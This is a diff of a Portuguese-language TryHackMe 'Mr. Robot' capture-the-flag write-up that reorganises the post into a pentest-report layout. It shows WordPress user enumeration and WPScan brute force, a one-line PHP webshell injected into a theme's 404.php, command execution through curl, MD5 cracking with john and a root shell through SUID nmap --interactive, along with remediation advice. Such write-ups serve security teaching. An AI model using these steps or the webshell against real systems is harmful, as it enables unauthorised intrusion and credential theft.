@@ -1,6 +1,6 @@
 ---
 title: "TryHackMe — Mr. Robot Writeup"
-description: "Resolução completa da sala Mr. Robot do TryHackMe: enumeração com Nmap e Gobuster, força bruta no WordPress com WPScan, webshell via tema, crack de MD5 e escalação de privilégio com SUID nmap."
+description: "Resolução completa da sala Mr. Robot do TryHackMe: exposição de arquivos via robots.txt, força bruta no WordPress, webshell via editor de temas, crack de MD5 e escalação de privilégio com SUID nmap."
 pubDate: 2026-08-14
 category: "Machine Write-ups"
 tags: ["TryHackMe", "WordPress", "WPScan", "Webshell", "John", "SUID", "Linux PrivEsc"]
@@ -8,27 +8,35 @@ tags: ["TryHackMe", "WordPress", "WPScan", "Webshell", "John", "SUID", "Linux Pr
 
 ## Introdução
 
-A sala **Mr. Robot** do TryHackMe é inspirada na série homônima e tem como objetivo encontrar **3 flags** escondidas em um servidor Linux rodando WordPress. O caminho passa por enumeração web, força bruta de credenciais, injeção de webshell e escalação de privilégio via binário SUID legado.
-
-**Alvo:** `10.65.188.34`
+A sala **Mr. Robot** do TryHackMe é inspirada na série homônima e classificada como nível **Médio**. O ambiente simula um servidor Linux mal configurado rodando WordPress — com falhas que vão desde exposição de arquivos sensíveis até permissões incorretas em binários do sistema. O objetivo é capturar 3 flags progressivas que exigem exploração em cadeia.
 
 ---
 
-## Resumo das Flags
+## Sumário Executivo
 
-| Flag | Hash |
-|------|------|
-| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
-| Key 2 | `822c73956184f694993bede3eb39f959` |
-| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |
+O servidor expôs uma wordlist personalizada e a primeira flag diretamente via `robots.txt`. A combinação de enumeração de usuário no WordPress com a wordlist obtida permitiu força bruta bem-sucedida das credenciais administrativas. Com acesso ao painel, injetamos uma webshell no editor de temas e obtivemos execução remota de código. Um hash MD5 sem sal encontrado no sistema foi quebrado com `john`, concedendo acesso SSH ao usuário `robot`. A escalação final para root foi possível por um binário `nmap` com bit SUID ativo em versão legada — vulnerável ao modo interativo que spawna shell como root.
 
-Cadeia de exploração: `robots.txt` → força bruta no WordPress → webshell → crack de hash MD5 → SSH → SUID `nmap` → root.
+**Impacto:** comprometimento total do servidor com acesso root.
 
 ---
 
-## 1. Reconhecimento
+## Escopo e Ambiente
 
-### Scan de Portas
+| Campo | Valor |
+|-------|-------|
+| Plataforma | TryHackMe |
+| IP do alvo | `10.65.188.34` |
+| Sistema Operacional | Linux (Ubuntu) |
+| Serviços expostos | SSH (22), HTTP (80), HTTPS (443) |
+| Data do teste | 2026-08-14 |
+
+---
+
+## Metodologia
+
+### 1. Reconhecimento
+
+#### Scan de Portas
 
 ```bash
 nmap -sV -sC -Pn 10.65.188.34
@@ -40,21 +48,23 @@ nmap -sV -sC -Pn 10.65.188.34
 443/tcp  open  ssl/http Apache httpd
 ```
 
-Servidor Apache rodando WordPress. SSH aberto na porta 22.
+Servidor Apache com SSH exposto. A presença de `/wp-login.php` e estrutura de diretórios confirmou instalação de **WordPress**.
 
-### Enumeração de Diretórios
+#### Enumeração de Diretórios
 
 ```bash
 gobuster dir -u http://10.65.188.34 -w /usr/share/wordlists/dirb/common.txt
 ```
 
 Resultados relevantes:
-- `/wp-admin`, `/wp-content`, `/wp-includes` → **WordPress**
-- `/robots.txt` → presente e acessível
+- `/wp-admin`, `/wp-content`, `/wp-includes` → WordPress ativo
+- `/robots.txt` → acessível publicamente
 
 ---
 
-## 2. Key 1 — robots.txt
+### 2. Enumeração
+
+#### robots.txt — Exposição de Arquivos Sensíveis
 
 ```bash
 curl http://10.65.188.34/robots.txt
@@ -66,34 +76,22 @@ fsocity.dic
 key-1-of-3.txt
 ```
 
-O `robots.txt` expõe dois arquivos diretamente: a primeira flag e uma wordlist customizada.
+O arquivo `robots.txt` listou dois recursos críticos: a **Key 1** e uma wordlist customizada `fsocity.dic`. Ambos foram obtidos diretamente via HTTP sem autenticação.
 
-```bash
-curl http://10.65.188.34/key-1-of-3.txt
-```
-
-**Key 1: `073403c8a58a1f80d943455fb30724b9`**
-
-### Download e limpeza da wordlist
+#### Download e Otimização da Wordlist
 
 ```bash
 curl http://10.65.188.34/fsocity.dic -o fsocity.dic
-wc -l fsocity.dic          # 858.160 linhas
+wc -l fsocity.dic           # 858.160 linhas — com massiva repetição
 sort -u fsocity.dic > fsocity_uniq.dic
-wc -l fsocity_uniq.dic     # 11.451 linhas
+wc -l fsocity_uniq.dic      # 11.451 linhas após deduplicação
 ```
 
-A wordlist tem muita repetição — deduplicar antes de usar economiza tempo no brute force.
+Redução de 98,6% no tamanho — impacto direto na velocidade do ataque seguinte.
 
----
+#### Enumeração de Usuário no WordPress
 
-## 3. Força Bruta no WordPress
-
-### Enumerando o usuário
-
-O formulário em `/wp-login.php` retorna mensagens de erro distintas para usuário inválido versus senha errada. Isso permite enumerar usuários válidos observando o tamanho da resposta HTTP.
-
-Testando com WPScan:
+O endpoint `/wp-login.php` retorna mensagens de erro distintas conforme o campo inválido: *"Invalid username"* vs *"The password you entered for the username X is incorrect"*. Essa diferença permite confirmar usuários válidos sem autenticação.
 
 ```bash
 wpscan --url http://10.65.188.34 --enumerate u
@@ -101,10 +99,16 @@ wpscan --url http://10.65.188.34 --enumerate u
 
 Usuário confirmado: **`elliot`**
 
-### Quebrando a senha com WPScan
+---
+
+### 3. Exploração
+
+#### Força Bruta de Credenciais WordPress
 
 ```bash
-wpscan --url http://10.65.188.34 --usernames elliot --passwords fsocity_uniq.dic
+wpscan --url http://10.65.188.34 \
+  --usernames elliot \
+  --passwords fsocity_uniq.dic
 ```
 
 ```text
@@ -112,19 +116,17 @@ wpscan --url http://10.65.188.34 --usernames elliot --passwords fsocity_uniq.dic
  | Username: elliot, Password: ER28-0652
 ```
 
-Credenciais: `elliot : ER28-0652`
+Credenciais obtidas: `elliot : ER28-0652`
 
----
+#### Webshell via Editor de Temas
 
-## 4. Webshell via Tema WordPress
-
-Com acesso ao painel `/wp-admin`, navegamos até **Appearance → Theme Editor → 404.php** do tema ativo (**twentyfifteen**) e injetamos uma webshell simples:
+Com acesso ao painel `/wp-admin`, navegamos até **Appearance → Theme Editor → 404.php** do tema ativo (**twentyfifteen**). O arquivo de template é editável diretamente pela interface — injetamos uma webshell de uma linha:
 
 ```php
 <?php system($_GET["c"]); ?>
 ```
 
-Salvamos e testamos a execução:
+Validação da execução remota de código:
 
 ```bash
 curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=id'
@@ -136,30 +138,29 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 
 RCE confirmado como usuário `daemon`.
 
-### Enumerando o diretório /home/robot
+#### Enumeração do Sistema via Webshell
 
 ```bash
-curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=ls+-la+/home/robot'
+# Listando o diretório do usuário robot
+curl '...404.php?c=ls+-la+/home/robot'
 ```
 
 ```text
--r-------- 1 robot robot   key-2-of-3.txt
--rw-r--r-- 1 robot robot   password.raw-md5
+-r-------- 1 robot robot   key-2-of-3.txt        ← ilegível por daemon
+-rw-r--r-- 1 robot robot   password.raw-md5      ← legível por todos
 ```
 
-A flag 2 só pode ser lida pelo usuário `robot`. Mas o arquivo `password.raw-md5` é legível por todos:
-
 ```bash
-curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=cat+/home/robot/password.raw-md5'
+curl '...404.php?c=cat+/home/robot/password.raw-md5'
 ```
 
 ```text
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
----
+Hash MD5 sem sal exposto em arquivo com permissões abertas.
 
-## 5. Crack do Hash MD5
+#### Crack do Hash MD5
 
 ```bash
 echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
@@ -170,40 +171,36 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 abcdefghijklmnopqrstuvwxyz
 ```
 
-**Senha do robot: `abcdefghijklmnopqrstuvwxyz`**
+Senha recuperada em segundos — MD5 sem sal é equivalente a armazenar senha em texto claro para fins práticos.
 
----
-
-## 6. Key 2 — SSH como robot
+#### Acesso SSH como robot
 
 ```bash
 ssh robot@10.65.188.34
 # senha: abcdefghijklmnopqrstuvwxyz
 
-cat key-2-of-3.txt
+cat /home/robot/key-2-of-3.txt
 ```
-
-**Key 2: `822c73956184f694993bede3eb39f959`**
 
 ---
 
-## 7. Key 3 — Escalação de Privilégio via SUID nmap
+### 4. Escalação de Privilégio
 
-### Buscando binários SUID
+#### Levantamento de Binários SUID
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
 ```text
-/usr/local/bin/nmap
+/usr/local/bin/nmap    ← SUID ativo, versão 3.81
 ```
 
-O `nmap` versão 3.81 tem o bit SUID ativo — qualquer comando executado por ele herda permissões de **root**.
+O binário `nmap` possui o bit **SUID** configurado — qualquer processo filho herda o UID do dono do arquivo (root).
 
-### Exploit: modo interativo do nmap
+#### Exploit: Modo Interativo do nmap
 
-Versões antigas do nmap (< 5.x) possuem um modo interativo que permite executar comandos shell via `!`:
+Versões do nmap anteriores à 5.x incluem um modo interativo (`--interactive`) que permite executar comandos shell diretamente. Como o processo roda como root via SUID, o shell spawned herda UID 0:
 
 ```bash
 nmap --interactive
@@ -211,31 +208,44 @@ nmap --interactive
 
 ```text
 nmap> !sh
+
 # id
 uid=0(root) gid=0(root) groups=0(root),1002(robot)
+
+# cat /root/key-3-of-3.txt
 ```
 
-Shell root obtido. Coletando a flag final:
-
-```bash
-cat /root/key-3-of-3.txt
-```
-
-**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**
+Acesso root obtido sem exploração de CVE — configuração incorreta de permissão.
 
 ---
 
-## Conclusão
+## Análise de Risco
 
-| # | Vetor | Flag |
-|---|-------|------|
-| 1 | `robots.txt` expondo arquivos sensíveis | `073403c8a58a1f80d943455fb30724b9` |
-| 2 | Crack de MD5 → SSH como robot | `822c73956184f694993bede3eb39f959` |
-| 3 | SUID `nmap --interactive` → root | `04787ddef27c3dee1ee161b21670b4e4` |
+| Vulnerabilidade | Severidade | Causa Raiz | Remediação |
+|-----------------|------------|------------|------------|
+| Arquivos sensíveis em `robots.txt` | **Média** | Má configuração — arquivos no webroot listados publicamente | Remover arquivos sensíveis do webroot; `robots.txt` não oferece controle de acesso |
+| Enumeração de usuário no WordPress | **Média** | Mensagens de erro distintas no `wp-login.php` | Padronizar mensagem de erro; usar plugin de proteção de login |
+| Força bruta sem rate limiting | **Alta** | Ausência de lockout e limitação de tentativas | Implementar lockout após N falhas; usar CAPTCHA ou 2FA |
+| Hash MD5 sem sal | **Alta** | Algoritmo criptograficamente inadequado para senhas | Migrar para bcrypt, scrypt ou Argon2 com salt único |
+| Arquivo de hash legível por outros usuários | **Alta** | Permissões incorretas (`-rw-r--r--`) em arquivo de credenciais | `chmod 600` em arquivos de senha; nunca armazenar hashes fora de DBs protegidos |
+| SUID em `nmap` legado | **Crítica** | Permissão excessiva em binário com funcionalidade de execução de shell | Remover bit SUID (`chmod u-s /usr/local/bin/nmap`); atualizar ou desinstalar versões legadas |
 
-### Lições aprendidas
+---
 
-- **`robots.txt` não é segurança.** Nunca liste arquivos sensíveis ali — ele é público por definição.
-- **WordPress com usuário enumerável + wordlist embutida no próprio servidor** é uma combinação fatal para força bruta.
-- **Hashes MD5 sem sal** quebram trivialmente com `rockyou.txt`.
-- **Binários SUID legados** são vetores clássicos de privesc — audite regularmente com `find / -perm -4000`.
+## Lições Aprendidas
+
+- **`robots.txt` é um mapa, não uma barreira.** Tudo listado ali é público — nunca referencie arquivos que não deveriam ser acessíveis.
+- **Mensagens de erro distintas** em formulários de login são uma vulnerabilidade de enumeração. A resposta deve ser idêntica independente do campo inválido.
+- **Wordlists vindas do próprio alvo** são sempre mais eficazes — o servidor essencialmente forneceu a chave para sua própria invasão.
+- **MD5 sem sal quebra em segundos** com hardware comum. Qualquer sistema que ainda use MD5 para senhas está operando abaixo do mínimo aceitável de segurança.
+- **Audite binários SUID regularmente** — `find / -perm -4000` deve fazer parte de qualquer checklist de hardening. A regra é: SUID só onde estritamente necessário.
+
+---
+
+## Flags
+
+| Flag | Localização | Método de Obtenção |
+|------|-------------|-------------------|
+| Key 1 | `/key-1-of-3.txt` | Acesso direto via `robots.txt` |
+| Key 2 | `/home/robot/key-2-of-3.txt` | Crack de hash MD5 → SSH como `robot` |
+| Key 3 | `/root/key-3-of-3.txt` | SUID `nmap --interactive` → shell root |
